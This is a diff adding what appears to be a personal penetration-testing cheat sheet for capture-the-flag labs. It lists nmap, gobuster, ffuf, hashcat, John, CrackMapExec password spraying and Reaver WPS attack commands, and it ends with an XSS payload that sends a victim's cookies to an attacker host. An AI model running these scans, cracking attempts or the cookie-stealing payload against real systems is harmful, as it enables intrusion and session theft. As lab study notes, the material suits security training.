@@ -1,0 +1,119 @@
+**Nmap**
+stealth scan -> map -sS -T4 -p- -Pn 10.10.11.48
+Udp scan first 100 ports -> nmap -sU -T4 -p1-100 -Pn 10.10.11.48
+Udp scan most used 100 ports -> nmap -sU -T4 --top-ports=100 -Pn 10.10.11.48
+web vhost scan -> nmap -p80 --script http-vhosts --script-args 'http-vhosts.domain=example.com,http-vhosts.file=vhosts.txt' <target> 
+
+ipsec scan ->sudo nmap -sC -sV -vv -oA [ip] 
+{
+ -sV -> version detection
+ -sC -> default enum script 
+  -sS -> stealth scan only syn packet
+  -sU -> udp scan
+  -vv -> very verbose 
+  -oA -> output all {as file !!!!}
+  
+ }
+
+
+
+**SmbClient**
+
+**SNMP Enum**
+snmp-check -> snmp-check 192.168.1.2 -c public
+snmp-walk->  snmpwalk -v1 -c public 10.10.11.48
+
+**Gobuster Enum**
+gobuster dir -u [URL] -w /usr/share/wordlist/dirb/common.txt -t 50
+gobuster dns -d example.thm -w /path/to/wordlist
+gobuster vhost -u http://<IP> -w vhosts.txt
+**ipsec** vhost scan-> gobuster vhost -u http://[domain name] -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
+
+**ffuf**
+ffuf -u [URL] -w /usr/share/wordlists/dirb/subdomains-top1iml-20000.txt -H "Host: FUZZ.[hostname/ip]" -ac
+ffuf -w vhosts.txt -u http://<IP> -H "Host: FUZZ.example.com"
+{
+-s -> show only the results that are important ! 
+-fc -> filter by http status
+-fs -> filter by response size 
+}
+
+**hash-id**
+hashid [password]
+
+**HashCat**
+hashcat -m [value] -a [value] [hashfile] [wordlist]
+example: sudo hashcat -m 0 -a 0 412DD4759978ACFCC81DEAB01B382403 /usr/share/wordlists/rockyou.txt
+
+Explanation:
+hashcat: The tool itself.
+
+-m 0: Hash mode 0 stands for MD5. You must set this correctly based on your hash type.
+
+-a 0: Attack mode 0 is a dictionary attack.
+
+412DD4759978ACFCC81DEAB01B382403: The hash you want to crack.
+
+/usr/share/wordlists/rockyou.txt: The wordlist you're using for the attack.
+
+How to Know Which -m (Hash Mode) to Use?
+You need to know what type of hash you're cracking. Some common examples:
+
+-m 0: MD5
+
+-m 100: SHA1
+
+-m 3000: LM
+
+-m 500: MD5(Unix)
+
+-m 1800: sha512crypt (Unix)
+
+-m 1000: NTLM
+
+**feroxbuster**
+feroxbuster -u http://[ip] -x php
+{
+-u -> url
+-x -> check for suffix for example php suffix
+-t -> num of threads
+}
+**websites tools**
+cyberchef 
+https://gtfobins.github.io/ -> a lot of linux vulnerabilities options to each command and situation 
+if got sudo to nano options etc
+
+**John The Reaper**
+john --wordlist=/usr/share/wordlists/rockyou.txt --rules --format=sha512crypt hash.txt
+
+**ftp**
+wget -r ftp://[IP] -> recursively download all the exposed files:
+
+**exiftool**
+metadata finder 
+exiftool [regex]
+
+**CrackMapExec**
+cme ssh [IP] -u users.txt -p '"password"'
+
+**Reaver**
+reaver -i [interface] -b [access point] -v
+{
+-i -> interface like wlan0 mon0 etc
+-b -> access point {mac address format}
+}
+
+**iw**
+iw is a new nl80211 based CLI configuration utility for wireless devices
+iw [interface for example:wlan0] info
+
+**Curl**
+curl http://10.10.11.8:5000
+
+**Nikto**
+Nikto is an open-source web server vulnerability scanner. It’s widely used by security professionals and penetration testers to identify misconfigurations, outdated software, and common security issues in web servers and web applications.
+
+nikto -h http://example.com
+
+**XSS Payload**
+cookie without httponly -> <script>var i=new Image(); i.src="http://10.10.14.6/?c="+document.cookie;</script>
